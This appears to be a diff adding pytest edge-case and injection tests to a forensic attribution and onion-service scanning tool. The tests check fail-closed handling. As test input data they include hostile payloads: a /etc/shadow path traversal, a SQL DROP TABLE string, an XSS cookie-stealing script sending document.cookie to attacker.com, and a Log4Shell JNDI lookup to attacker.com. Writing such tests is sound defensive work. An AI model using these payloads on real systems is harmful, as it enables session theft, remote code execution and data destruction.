@@ -350,3 +350,81 @@ def test_api_export_stix():
     data = res.json()
     assert data["type"] == "bundle"
     assert data["spec_version"] == "2.1"
+
+
+# ==============================================================================
+# 8. Pillar 2 Edge-Case, Boundary & Malformed Injection Probes
+# ==============================================================================
+
+def test_edge_case_null_and_none_probes():
+    """Verify fail-closed handling for None/null parameters and empty signal structures."""
+    # 1. Scorer with empty or None-like signal evaluation
+    eval_result = AsymmetricAttributionScorer.evaluate_signals([])
+    assert eval_result["composite_score"] == 0.0
+    assert eval_result["confidence_tier"] == "UNRELIABLE"
+    assert eval_result["has_deterministic_proof"] is False
+
+    # 2. API endpoint rejecting None / invalid body (HTTP 422 Unprocessable Entity)
+    res = client.post("/api/stylometry", json={"sample_text": None})
+    assert res.status_code in (400, 422)
+
+    # 3. Security core handles None / empty token comparison safely
+    assert ForensicSecurityCore.constant_time_compare("", "") is True
+    assert ForensicSecurityCore.constant_time_compare("abc", "") is False
+
+
+def test_edge_case_boundary_empty_and_zero_limits():
+    """Verify boundary conditions with 0 values, empty string limits, and zero-length inputs."""
+    # 1. Zero weight signal evaluation
+    zero_signal = AttributionSignal(
+        signal_name="Zero Weight Test Signal",
+        tier="Probabilistic",
+        weight=0.0,
+        score=0.95,
+        rationale="Testing zero boundary condition"
+    )
+    res = AsymmetricAttributionScorer.evaluate_signals([zero_signal])
+    assert res["composite_score"] == 0.0
+    assert res["confidence_tier"] == "UNRELIABLE"
+
+    # 2. Empty string text input to stylometry engine
+    empty_res = StylometricEngine.analyze_sample("")
+    assert empty_res["sample_length_chars"] == 0
+    assert empty_res["indicbert_cosine_similarity"] == 0.0
+
+    # 3. Buffer overflow limit probe on PureMurmurHash3 with 64KB repetitive pattern
+    overflow_buffer = b"A" * 65536
+    h = PureMurmurHash3.hash32(overflow_buffer, seed=0)
+    assert isinstance(h, int)
+
+
+def test_edge_case_malformed_inputs_and_injection_probes():
+    """Verify system security invariants against malformed onion domains, SQL injection and XSS payloads."""
+    # 1. Malformed onion address formats
+    malformed_onions = [
+        "not-an-onion.com",
+        "../../etc/shadow",
+        "; DROP TABLE forensic_logs; --",
+        "<script>alert(1)</script>.onion",
+        "short.onion"
+    ]
+    engine1 = InfrastructureDeAnonymizer()
+    for bad_onion in malformed_onions:
+        result = engine1.scan_hidden_service(bad_onion)
+        # Must fail-closed without server crashes or unhandled exceptions
+        assert result["status"] in ("FAILED_SCAN", "TARGET_UNREACHABLE", "SIMULATED_PROBE") or result.get("mod_status_ip_leak") is None
+
+    # 2. SQL injection and XSS payload strings in stylometry input
+    injection_payloads = [
+        "' OR '1'='1' -- SQL injection forensic test string",
+        "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
+        "{{7*7}} template injection forensic test sample",
+        "${jndi:ldap://attacker.com/a} log4j injection payload test"
+    ]
+    for injection in injection_payloads:
+        res = client.post("/api/stylometry", json={"sample_text": injection})
+        assert res.status_code == 200
+        # Check payload was processed safely as plain forensic text without code execution
+        data = res.json()
+        assert "indicbert_cosine_similarity" in data
+
